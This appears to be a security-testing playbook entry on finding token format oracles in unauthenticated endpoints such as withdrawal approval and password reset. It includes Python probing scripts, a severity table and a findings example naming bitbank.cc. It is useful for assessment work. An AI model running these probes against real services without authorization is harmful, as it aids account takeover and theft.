# Token Format Oracle Pattern

## When to Use
- Unauthenticated token-based endpoints discovered (email confirmation, withdrawal approval, password reset)
- Endpoint returns different error codes for valid-format vs invalid-format tokens
- No rate limiting on the endpoint

## Technique

### 1. Identify Token-Based Endpoints
From JS analysis, look for endpoints that accept a `token` or `mail_token` parameter without requiring session auth or reCAPTCHA:
- `/approve_withdrawal` (token)
- `/register_mail` (mail_token)
- `/signedup` (mail_token)
- `/password` (mail_token)
- `/verify_email` (token)
- `/confirm_account` (token)

### 2. Determine Token Length via Error Differentiation
Send tokens of varying lengths and observe error code changes:

```python
import httpx

client = httpx.Client(verify=False, timeout=10)
for length in [8, 16, 20, 32, 40, 48, 56, 60, 62, 63, 64, 65, 66, 70, 80, 96, 128]:
    token = "a" * length
    resp = client.post(f'https://target/endpoint', json={"token": token})
    code = resp.json().get('data', {}).get('code', resp.status_code)
    print(f"  len={length:3d} -> code={code}")
```

**Oracle signal:** One specific length returns a DIFFERENT error code than all others. This means:
- Different code = "format valid, token not found in DB" (passed format validation, hit DB lookup)
- Standard code = "format invalid" (rejected before DB lookup)

### 3. Determine Token Character Set
Once length is known, test character sets:
```python
tokens_at_length = [
    ("all hex lower", "a" * N),
    ("all hex upper", "A" * N),
    ("non-hex char g", "g" * N),
    ("numeric only", "1" * N),
    ("alphanumeric", "aB3" * (N//3) + "a" * (N % 3)),
    ("with special", "a" * (N-1) + "-"),
]
```
If non-hex chars still trigger the "valid format" error, it's not hex-restricted.

### 4. Check Rate Limiting
```python
for i in range(20):
    resp = client.post(url, json={"token": f"{'a'*(N-1)}{i}"})
    if resp.status_code == 429:
        print(f"Rate limited after {i} requests")
        break
```

### 5. Timing Oracle (usually fails but worth 30 seconds)
```python
import time, statistics
for token in [known_format_tokens]:
    timings = []
    for _ in range(8):
        start = time.time()
        client.post(url, json={"token": token})
        timings.append((time.time() - start) * 1000)
    print(f"  {token[:16]}... avg={statistics.mean(timings):.1f}ms std={statistics.stdev(timings):.1f}ms")
```
Network jitter usually dominates. Only useful if std < 5ms.

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Format oracle only (token entropy high, e.g. 64 chars) | Info |
| Format oracle + no rate limit + short token (< 8 chars or numeric) | High/Critical |
| Format oracle + predictable generation (sequential, time-based) | Critical |
| Format oracle + token leaked elsewhere (logs, emails, other endpoint) | Critical |

## Real-World Example (bitbank.cc, June 2026)
- `/approve_withdrawal` accepts POST with `{"token": "..."}` — no auth, no reCAPTCHA, no rate limit
- 64-char tokens return error 20020 ("not found"), all other lengths return 40047 ("invalid format")
- Token character set unrestricted (not hex-only)
- Entropy too high to brute-force (~2^256 if truly random)
- Severity: Info (format disclosure only, no practical exploit)
- Would become Critical if combined with: token leak in logs, predictable generation, or MITM on confirmation emails
